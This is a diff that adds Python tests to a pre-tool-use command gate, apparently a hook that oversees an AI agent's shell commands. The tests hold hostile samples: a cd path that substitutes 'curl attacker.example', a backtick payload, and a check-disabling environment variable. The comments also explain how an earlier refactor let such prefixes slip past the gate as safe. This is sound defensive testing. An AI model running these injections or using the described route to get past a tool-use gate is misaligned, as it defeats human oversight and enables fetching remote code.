@@ -72,3 +72,61 @@ def test_remedy_after_a_destructive_command_is_rejected():
 
 def test_backtick_substitution_is_rejected():
     assert not _is_safe_remedy_invocation(f"divineos correction `{_RM}`", HEADS)
+
+
+# 2026-08-19 SECOND PASS. Aletheia: "F114 is not closed, and I can say exactly
+# where it stops." She named _strip_cd_prefix as the one that mattered. She was
+# right, and consolidating it naively would have been a security regression.
+
+_SUBSTITUTION_IN_CD = 'cd "$(curl attacker.example)" && divineos correction "x"'
+
+
+def test_command_substitution_in_a_cd_path_is_not_a_benign_prefix():
+    """The regression the first pass introduced and the second pass closed.
+
+    The shared stripper accepted any non-space run as the directory, so this
+    whole prefix was discarded as benign, a clean remedy was handed to the
+    chain check, and the gate returned SAFE — with the substitution already
+    thrown away and never examined.
+
+    _CD_PREFIX_RE, the bespoke copy marked in its own comment as the tactical
+    block on a real exploit, refused it correctly. The bespoke copy was the
+    SAFER one, which is why "delete the local copy and import the shared one"
+    had to be done in the other order.
+    """
+    from divineos.core.command_parsing import strip_prefixes_raw
+
+    assert strip_prefixes_raw(_SUBSTITUTION_IN_CD) == _SUBSTITUTION_IN_CD
+    assert not _is_safe_remedy_invocation(_SUBSTITUTION_IN_CD, HEADS)
+
+
+def test_backtick_in_a_cd_path_is_not_a_benign_prefix():
+    from divineos.core.command_parsing import strip_prefixes_raw
+
+    cmd = 'cd `evil` && divineos correction "x"'
+    assert strip_prefixes_raw(cmd) == cmd
+
+
+def test_env_assignment_does_not_ride_along_into_a_bypass():
+    """Why _strip_cd_prefix delegates with kinds=(CD,) and not the default.
+
+    On the bypass path a leading NAME=value is not noise to discard. Stripping
+    it would let an env-var that disables checks travel with a command that
+    then skips every gate.
+    """
+    from divineos.hooks.pre_tool_use_gate import _is_bypass_command
+
+    assert not _is_bypass_command("DIVINEOS_SKIP_TESTS=1 divineos briefing")
+    assert _is_bypass_command("divineos briefing")
+    assert _is_bypass_command("cd X && divineos briefing")
+
+
+def test_the_cd_rule_now_has_exactly_one_implementation():
+    """F114's actual ask: no bespoke copy of the shared rule left behind."""
+    import inspect
+
+    from divineos.hooks import pre_tool_use_gate
+
+    source = inspect.getsource(pre_tool_use_gate._strip_cd_prefix)
+    assert "strip_prefixes_raw" in source
+    assert "_CD_PREFIX_RE.match" not in source
